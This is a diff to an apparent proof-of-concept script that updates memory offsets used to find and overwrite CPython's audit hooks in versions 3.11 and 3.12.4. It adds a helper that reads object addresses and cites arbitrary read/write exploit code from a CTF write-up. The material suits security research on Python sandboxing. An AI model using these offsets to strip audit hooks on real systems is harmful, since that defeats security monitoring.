@@ -10,18 +10,18 @@ from audit_hook_head_finder import add_audit
 # the third is the offset to get the audit hook set by python
 # the fourth is the offset to get the audit hook set by C
 if sys.version_info[:2] == (3, 12):
-    PTR_OFFSET = [24, 48, 0x468f0, -0xc948]
+    # PTR_OFFSET = [24, 48, 0x468f0, -0xc948] # <= 3.12.3
+    PTR_OFFSET = [24, 48, 0x46920, -0xc948] # for python3.12.4
 else:
-    # there are multiple offsets for 3.11
-    # PTR_OFFSET = [8, 8, 0x9f10, 0x19098]
-    PTR_OFFSET = [24, 48, 0x3e370, 0x4d4f8]
-    # and etc, check the result of POC-no-ctypes-native.py
+    # there are multiple offsets for 3.11? check the result of POC-no-ctypes.py
+    PTR_OFFSET = [24, 48, 0x4d558, 0x3e3d0]
 
 add_audit()
 sys.addaudithook((lambda x: lambda *args: x("audit hook triggered!", args))(print))
 
 os.system("echo 'test audit hook -- this will trigger hook'")
 
+# get addr from str helper func
 getptr = lambda func: int(str(func).split("0x")[-1].split(">")[0], 16)
 
 # following arbitery reading/writing exploit code from https://maplebacon.org/2024/02/dicectf2024-irs/
